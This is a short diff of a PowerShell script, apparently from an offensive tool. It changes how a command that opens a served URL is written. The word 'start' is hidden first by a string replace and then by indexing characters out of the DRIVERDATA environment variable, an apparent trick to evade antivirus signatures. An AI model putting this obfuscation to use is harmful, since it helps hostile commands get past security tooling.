@@ -539,7 +539,7 @@ If($Exec.IsPresent)
    $mytable.Columns.Add("Execute http.server")|Out-Null
 
    ## Add values to table
-   $ToExecut = "&('s0xar0x' -replace '0x','t') $FinalUrl"
+   $ToExecut = "&(`$Env:DRIVERDATA[9,14,35,21,14]-join'') $FinalUrl"
    $mytable.Rows.Add("$ToExecut")|Out-Null
 
    ## Display Data Table
